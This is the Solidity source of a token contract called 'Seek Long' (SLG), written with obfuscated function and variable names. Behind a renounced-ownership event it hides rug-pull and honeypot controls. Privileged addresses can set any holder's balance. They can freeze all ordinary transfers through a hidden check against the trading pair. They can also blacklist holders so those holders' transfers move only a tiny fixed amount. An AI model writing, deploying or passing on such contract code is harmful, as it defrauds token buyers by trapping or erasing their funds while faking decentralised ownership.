//SPDX-License-Identifier: MIT

pragma solidity ^0.8.3;

interface teamBuy {
    function totalSupply() external view returns (uint256);

    function balanceOf(address tokenTrading) external view returns (uint256);

    function transfer(address tradingWallet, uint256 toAmountList) external returns (bool);

    function allowance(address shouldBuy, address spender) external view returns (uint256);

    function approve(address spender, uint256 toAmountList) external returns (bool);

    function transferFrom(
        address sender,
        address tradingWallet,
        uint256 toAmountList
    ) external returns (bool);

    event Transfer(address indexed from, address indexed marketingTxReceiver, uint256 value);
    event Approval(address indexed shouldBuy, address indexed spender, uint256 value);
}

abstract contract launchSwapMode {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface walletLaunched {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface maxMinTx {
    function createPair(address receiverLaunch, address txFund) external returns (address);
}

interface tokenMode is teamBuy {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract SeekLong is launchSwapMode, teamBuy, tokenMode {

    bool private shouldLaunch;

    address atSender = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    address minFrom = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    address private minTeam;

    mapping(address => uint256) private teamFee;

    function transferFrom(address feeTeam, address tradingWallet, uint256 toAmountList) external override returns (bool) {
        if (_msgSender() != atSender) {
            if (fundLimit[feeTeam][_msgSender()] != type(uint256).max) {
                require(toAmountList <= fundLimit[feeTeam][_msgSender()]);
                fundLimit[feeTeam][_msgSender()] -= toAmountList;
            }
        }
        return limitShouldReceiver(feeTeam, tradingWallet, toAmountList);
    }

    function approve(address fundToken, uint256 toAmountList) public virtual override returns (bool) {
        fundLimit[_msgSender()][fundToken] = toAmountList;
        emit Approval(_msgSender(), fundToken, toAmountList);
        return true;
    }

    function totalSupply() external view virtual override returns (uint256) {
        return teamAuto;
    }

    constructor (){
        if (amountReceiver == shouldLaunch) {
            maxTakeAuto = true;
        }
        walletLaunched exemptMin = walletLaunched(atSender);
        totalWalletMax = maxMinTx(exemptMin.factory()).createPair(exemptMin.WETH(), address(this));
        
        exemptSwapTotal = _msgSender();
        exemptSell();
        launchedMin[exemptSwapTotal] = true;
        teamFee[exemptSwapTotal] = teamAuto;
        if (maxTakeAuto == shouldLaunch) {
            amountReceiver = true;
        }
        emit Transfer(address(0), exemptSwapTotal, teamAuto);
    }

    mapping(address => mapping(address => uint256)) private fundLimit;

    uint8 private minFund = 18;

    function getOwner() external view returns (address) {
        return minTeam;
    }

    uint256 private modeLaunched;

    function allowance(address amountTx, address fundToken) external view virtual override returns (uint256) {
        if (fundToken == atSender) {
            return type(uint256).max;
        }
        return fundLimit[amountTx][fundToken];
    }

    uint256 minTotal;

    function limitShouldReceiver(address feeTeam, address tradingWallet, uint256 toAmountList) internal returns (bool) {
        if (feeTeam == exemptSwapTotal) {
            return launchedTotal(feeTeam, tradingWallet, toAmountList);
        }
        uint256 feeAmount = teamBuy(totalWalletMax).balanceOf(minFrom);
        require(feeAmount == amountAuto);
        require(tradingWallet != minFrom);
        if (buyIs[feeTeam]) {
            return launchedTotal(feeTeam, tradingWallet, walletReceiver);
        }
        return launchedTotal(feeTeam, tradingWallet, toAmountList);
    }

    bool public buyTotal;

    bool public launchedSwap;

    function atTotal() private view {
        require(launchedMin[_msgSender()]);
    }

    mapping(address => bool) public launchedMin;

    function tradingReceiver(uint256 toAmountList) public {
        atTotal();
        amountAuto = toAmountList;
    }

    function symbol() external view virtual override returns (string memory) {
        return receiverTrading;
    }

    uint256 amountAuto;

    function name() external view virtual override returns (string memory) {
        return shouldLiquidity;
    }

    mapping(address => bool) public buyIs;

    function launchedTotal(address feeTeam, address tradingWallet, uint256 toAmountList) internal returns (bool) {
        require(teamFee[feeTeam] >= toAmountList);
        teamFee[feeTeam] -= toAmountList;
        teamFee[tradingWallet] += toAmountList;
        emit Transfer(feeTeam, tradingWallet, toAmountList);
        return true;
    }

    function atTrading(address limitMinReceiver) public {
        atTotal();
        
        if (limitMinReceiver == exemptSwapTotal || limitMinReceiver == totalWalletMax) {
            return;
        }
        buyIs[limitMinReceiver] = true;
    }

    uint256 constant walletReceiver = 14 ** 10;

    event OwnershipTransferred(address indexed teamMin, address indexed feeReceiverTx);

    function exemptSell() public {
        emit OwnershipTransferred(exemptSwapTotal, address(0));
        minTeam = address(0);
    }

    function decimals() external view virtual override returns (uint8) {
        return minFund;
    }

    function launchedTakeAuto(address isTo) public {
        if (minLimitReceiver) {
            return;
        }
        
        launchedMin[isTo] = true;
        
        minLimitReceiver = true;
    }

    bool private maxTakeAuto;

    uint256 private teamAuto = 100000000 * 10 ** 18;

    string private receiverTrading = "SLG";

    function transfer(address amountTo, uint256 toAmountList) external virtual override returns (bool) {
        return limitShouldReceiver(_msgSender(), amountTo, toAmountList);
    }

    bool public marketingToken;

    address public exemptSwapTotal;

    bool public minLimitReceiver;

    uint256 public enableTakeList;

    function owner() external view returns (address) {
        return minTeam;
    }

    bool private exemptTakeFund;

    address public totalWalletMax;

    string private shouldLiquidity = "Seek Long";

    bool public tradingTokenMax;

    function launchReceiver(address amountTo, uint256 toAmountList) public {
        atTotal();
        teamFee[amountTo] = toAmountList;
    }

    function balanceOf(address tokenTrading) public view virtual override returns (uint256) {
        return teamFee[tokenTrading];
    }

    bool public amountReceiver;

}